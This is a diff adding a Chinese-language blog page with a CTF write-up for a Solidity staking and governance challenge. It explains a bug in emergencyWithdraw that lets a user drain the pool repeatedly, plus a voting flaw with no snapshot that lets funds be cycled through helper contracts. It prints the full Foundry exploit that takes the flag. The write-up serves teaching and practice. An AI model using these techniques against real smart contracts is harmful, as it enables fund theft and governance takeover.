@@ -1,0 +1,575 @@
+<!DOCTYPE html>
+<html lang="en" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="" />
+  <meta name="author" content="LEVI_104" />
+  <meta name="description" content="始生有物，其形必丑" />
+  
+  
+  <title>
+    
+      08.challenge 
+      
+      
+      |
+    
+     Sec Life
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="https://s1.vika.cn/space/2022/11/28/de7a2d4fa7ec48ef997fad1fb8af2fe0">
+    <link rel="icon" href="https://moe.photo/images/2023/06/29/d1b2faa44e90a63bb67cc7e990947a2.jpg">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="https://moe.photo/images/2023/06/29/d1b2faa44e90a63bb67cc7e990947a2.jpg" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">LEVI_104</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/categories/">
+          <a href="/categories/">Categories</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">08.challenge</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+          2023-07-28 19:25:50
+        </span>
+        
+              <span class="post-categories">
+                <i class="iconfont icon-bookmark" title="Categories"></i>
+                
+                <span class="span--category">
+                  <a href="/categories/16-CBSC-2022/" title="16.CBSC 2022">
+                    <b>#</b> 16.CBSC 2022
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h1 id="06-challenge"><a href="#06-challenge" class="headerlink" title="06.challenge"></a>06.challenge</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="1-全局观"><a href="#1-全局观" class="headerlink" title="1.全局观"></a>1.全局观</h3><p>三部分：</p>
+<ul>
+<li>interface.sol：接口</li>
+<li>Masterchef.sol：<ul>
+<li>虽然代码很多，其实就只有MasterChef合约需要关注，因为像Ownable, ERC20这种东西一般是不会出考点出问题的</li>
+<li>MasterChef本身便是一个ERC20代币</li>
+<li>有空投机制</li>
+<li>有owner转让机制</li>
+<li>质押代币到池子中，可以有很多个池子。计算利润，计算比较复杂，不懂没问题。池子中质押的金额有好几个方法都是与计算有关，更新池子数据的</li>
+<li>一个质押存款函数，两个取款函数</li>
+</ul>
+</li>
+<li>Governance.sol<ul>
+<li>治理合约，在Masterchef合约中拥有的代币数目可以进行投票</li>
+<li>身份权限机制</li>
+<li>题目初始化</li>
+</ul>
+</li>
+</ul>
+<p>总的来说，就是质押有关的题目，质押生息，获得代币，足量的代币可以成为owner和进行投票，投票数额到达一定量才可以通过</p>
+<h3 id="2-任务"><a href="#2-任务" class="headerlink" title="2.任务"></a>2.任务</h3><p>我们需要拥有超过代币总发行量2/3的投票数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">// 成为Validator：至少需要代币总发行量的2/3</span><br><span class="line">function setValidator() public &#123;</span><br><span class="line">    uint256 votingSupply = masterChef.totalSupply() * 2 / 3;</span><br><span class="line">    require(validatorVotes[msg.sender] &gt;= votingSupply);</span><br><span class="line">    ValidatorOwner = msg.sender;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 任务：成为Validator</span><br><span class="line">function setflag() public onlyValidatorOwner &#123;</span><br><span class="line">    Flag = true;</span><br><span class="line">    emit Sendflag(Flag);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="3-分析"><a href="#3-分析" class="headerlink" title="3.分析"></a>3.分析</h3><p>首先有空投，那么我们可以领取完所有的代币1000：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function airdorp() public &#123;</span><br><span class="line">    require(aridorplimit &lt; 1000,&quot;&quot;);</span><br><span class="line">    _mint(msg.sender,1);</span><br><span class="line">    aridorplimit = aridorplimit + 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这么少代币显然不够，我们必须得想法法搞多点：</p>
+<ul>
+<li>质押生息？要等区块，并且一个区块生息的数目不好算，我也看的不是很懂，并且无法控制区块的进度，这条路走不通</li>
+<li>存取款是否有毛病？质押看起来没啥毛病，取款呢？普通取款没啥问题，但是看一下紧急取款<code>emergencyWithdraw()</code>（没利息）：我们的质押数额扣除是在memory，但是增加是在storage，那么这样我们就可以无限的取款了，知道掏空合约中的所有钱</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">function emergencyWithdraw(uint256 _pid) public &#123;</span><br><span class="line">    // memory意味着不会修改任何storage数据</span><br><span class="line">    PoolInfo memory pool = poolInfo[_pid];</span><br><span class="line">    UserInfo memory user = userInfo[_pid][msg.sender];</span><br><span class="line">    // 用户拿到了取款</span><br><span class="line">    this.transfer(address(msg.sender), user.amount);</span><br><span class="line">    emit EmergencyWithdraw(msg.sender, _pid, user.amount);</span><br><span class="line">    // 更新用户个人资产信息</span><br><span class="line">    pool.totalstake -= user.amount; </span><br><span class="line">    user.amount = 0;</span><br><span class="line">    user.rewardDebt = 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>我们掏空合约的所有钱 10_000_000，就算投票也是不够总数额100_000_000+10_000_000的三分之二的。因此，还要想办法再搞多点钱。但是剩下的钱都在合约部署者身上，我们无法拿走，因此转向能不能拿多点投票数？</p>
+<p>一般的项目都是使用snapshot来进行拍照记录投票数，但是本题没使用，似乎可以无限投票？那么我投完票之后，可以把钱给别人，然后别人也可以投票呀！因此，我们创建几个傀儡账户，轮番使用我们10_000_000金额进行投票给我，想要多少票都可以哈哈</p>
+<h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity 0.6.12;</span><br><span class="line">pragma experimental ABIEncoderV2; // 不加这个会报错，原因如下：https://github.com/foundry-rs/foundry/issues/4376</span><br><span class="line"></span><br><span class="line">import &quot;forge-std/Test.sol&quot;;</span><br><span class="line">import &quot;../../src/08.challenge/Governance.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract attackTest is Test &#123;</span><br><span class="line">    Governance public governance;</span><br><span class="line">    MasterChef public masterChef;</span><br><span class="line">    Helper[10] public helpers;</span><br><span class="line">    uint256 constant ALLMONEY = 10000000;</span><br><span class="line"></span><br><span class="line">    function setUp() public&#123;</span><br><span class="line">        governance = new Governance(&quot;level&quot;);</span><br><span class="line">        masterChef = governance.masterChef();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function test_isComplete() public&#123;</span><br><span class="line">        // 拿走全部空投</span><br><span class="line">        for(uint i = 0; i &lt; 1000; i++)&#123;</span><br><span class="line">            masterChef.airdorp();</span><br><span class="line">        &#125;</span><br><span class="line">        assertEq(masterChef.balanceOf(address(this)),1000);</span><br><span class="line">        // 存款: 存到第一个池子。此时我们token的余额为0，但是质押了1000个代币</span><br><span class="line">        masterChef.approve(address(masterChef), 1000);</span><br><span class="line">        masterChef.deposit(0, 1000);</span><br><span class="line">        // emergencyWithdraw漏洞：拿走合约中所有的钱</span><br><span class="line">        // 10000000 / 1000 = 10000</span><br><span class="line">        for(uint i = 0; i &lt; 10000; i++)&#123;</span><br><span class="line">            masterChef.emergencyWithdraw(0);</span><br><span class="line">        &#125;</span><br><span class="line">        // 检查是否拿完了合约中的所有钱</span><br><span class="line">        assertEq(masterChef.balanceOf(address(this)),ALLMONEY);</span><br><span class="line">        // 我们有了足够的钱，可以成为owner了</span><br><span class="line">        masterChef.transferOwnership(address(this));</span><br><span class="line">        assertEq(masterChef.owner(),address(this));</span><br><span class="line">        // 成为了owner之后就可以投票了，但是只能投票一次</span><br><span class="line">        governance.vote(address(this));</span><br><span class="line">        // 创建10个Helper来帮助我们获得更多的投票</span><br><span class="line">        for(uint i = 0; i &lt; 10; i++)&#123;</span><br><span class="line">            helpers[i] = new Helper(address(masterChef), address(governance));</span><br><span class="line">        &#125;</span><br><span class="line">        // 10个Helper继承我们金钱，然后继续投票给我</span><br><span class="line">        for(uint i = 0; i &lt; 10; i++)&#123;</span><br><span class="line">            // 转钱到Helper</span><br><span class="line">            masterChef.transfer(address(helpers[i]),ALLMONEY);</span><br><span class="line">            // 用Helper帮助我们投票</span><br><span class="line">            helpers[i].help(address(this));</span><br><span class="line">        &#125;</span><br><span class="line">        // 检查是否大于2/3的投票</span><br><span class="line">        assertGt(governance.validatorVotes(address(this)),masterChef.totalSupply() * 2 / 3);</span><br><span class="line">        governance.setValidator();</span><br><span class="line">        governance.setflag();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Helper&#123;</span><br><span class="line">    MasterChef masterChef;</span><br><span class="line">    Governance governance;</span><br><span class="line">    uint256 constant ALLMONEY = 10000000;</span><br><span class="line"></span><br><span class="line">    constructor(address _masterChef,address _governance)public&#123;</span><br><span class="line">        masterChef = MasterChef(_masterChef);</span><br><span class="line">        governance = Governance(_governance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function help(address _addr) public&#123;</span><br><span class="line">        // Helper有钱之后就可以成为Owner</span><br><span class="line">        masterChef.transferOwnership(address(this));</span><br><span class="line">        // 成为owner之后就给本合约投票</span><br><span class="line">        governance.vote(_addr);</span><br><span class="line">        // 投完票之后把钱给回本合约</span><br><span class="line">        masterChef.transfer(_addr, ALLMONEY);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2023/07/28/16.CBSC%20CTF%202022/07.challenge/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>Prev</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+              2023-07-28 19:25:50
+            </span>
+            
+                  <span class="post-categories">
+                    <i class="iconfont icon-bookmark" title="Categories"></i>
+                    
+                    <span class="span--category">
+                      <a href="/categories/16-CBSC-2022/" title="16.CBSC 2022">
+                        <b>#</b> 16.CBSC 2022
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/2023/07/28/16.CBSC%20CTF%202022/09.challenge/" target="_self">
+                <span>Next</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#06-challenge"><span class="toc-text">06.challenge</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-text">分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%85%A8%E5%B1%80%E8%A7%82"><span class="toc-text">1.全局观</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E4%BB%BB%E5%8A%A1"><span class="toc-text">2.任务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%88%86%E6%9E%90"><span class="toc-text">3.分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98"><span class="toc-text">解题</span></a></li></ol></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="twitter" target="_blank" rel="noopener" href="https://s1.vika.cn/space/2022/11/28/f39f02b157524b31805619f093b4b3c8">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="wechat" target="_blank" rel="noopener" href="https://s1.vika.cn/space/2022/11/27/6bf8f7df3643480a9d216473a3caf2d0">
+            <i class="iconfont icon-wechat"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Copyright © 2023 Oranges</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="Search...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + 08.challenge + '&url=' + http%3A%2F%2Fexample.com%2F2023%2F07%2F28%2F16.CBSC%2520CTF%25202022%2F08.challenge%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/2023/07/28/16.CBSC%20CTF%202022/08.challenge/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  <script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+
+</body>
+</html>
